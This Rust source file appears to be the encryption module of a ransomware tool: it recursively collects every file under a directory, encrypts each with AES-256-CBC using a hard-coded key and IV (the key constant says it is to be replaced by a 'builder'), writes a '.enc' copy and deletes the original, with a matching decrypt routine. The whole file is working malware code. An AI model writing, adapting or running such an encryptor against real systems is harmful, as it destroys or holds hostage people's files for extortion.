extern crate aes;
extern crate block_modes;
extern crate hex;
extern crate rand;

use aes::Aes256;
use block_modes::{BlockMode, Cbc};
use block_modes::block_padding::Pkcs7;
use std::fs::File;
use std::path::Path;
use std::fs;
use std::io::{Read, Write};
use std::error::Error;
use std::str;


type Aes256Cbc = Cbc<Aes256, Pkcs7>;

const KEY: &[u8] = b"keyhereshouldbereplacedbybuilder";
const IV: &[u8] = b"unique_initializ"; // IV should be 16 bytes
                                

fn encrypt_file(input_path: &str, output_path: &str) -> Result<(), Box<dyn Error>> {
    // Read the input file
    let mut input_file = File::open(input_path)?;
    let mut buffer = Vec::new();
    input_file.read_to_end(&mut buffer)?;

    // Encrypt the data
    let cipher = Aes256Cbc::new_from_slices(KEY, IV)?;
    let ciphertext = cipher.encrypt_vec(&buffer);

    // Write the encrypted data to the output file
    let mut output_file = File::create(output_path)?;
    output_file.write_all(&ciphertext)?;

    Ok(())
}

fn decrypt_file(input_path: &str, output_path: &str) -> Result<(), Box<dyn Error>> {
    // Read the encrypted file
    let mut input_file = File::open(input_path)?;
    let mut buffer = Vec::new();
    input_file.read_to_end(&mut buffer)?;

    // Decrypt the data
    let cipher = Aes256Cbc::new_from_slices(KEY, IV)?;
    let decrypted_data = cipher.decrypt_vec(&buffer)?;

    // Write the decrypted data to the output file
    let mut output_file = File::create(output_path)?;
    output_file.write_all(&decrypted_data)?;

    Ok(())
}

fn get_files(directory_path: &str) -> Vec<String> {
    let directory_path = Path::new(directory_path);
    let entries = fs::read_dir(directory_path).expect("Failed to read directory");

    let mut file_list = Vec::new();

    for entry in entries {
        let entry = entry.expect("Failed to read entry");
        let file_path = entry.path();
        if file_path.is_file() {
            file_list.push(file_path.to_string_lossy().to_string());
        } else if file_path.is_dir() {
            let sub_files = get_files(file_path.to_string_lossy().as_ref());
            file_list.extend(sub_files);
        }
    }

    file_list
}

pub fn encrypt_directory(directory_path: &str) -> Result<(), Box<dyn Error>> {
    let directory = get_files(directory_path);
    for mut file in directory {
        let encrypted_file_path = file.as_mut().to_owned() + ".enc";
        if encrypt_file(&file, &encrypted_file_path).is_err() { break; }
        if fs::remove_file(file).is_err() { break; }
    }
    Ok(())
}

pub fn decrypt_directory(directory_path: &str) -> Result<(), Box<dyn Error>> {
    let directory = get_files(directory_path);
    for mut file in directory {
        let mut file_path = file.as_mut().to_owned();
        let ext_index = file_path.rfind('.').unwrap();
        file_path.truncate(ext_index);
        if decrypt_file(&file, &file_path).is_err() { break; }
        if fs::remove_file(file).is_err() { break; }
    }
    Ok(())
}


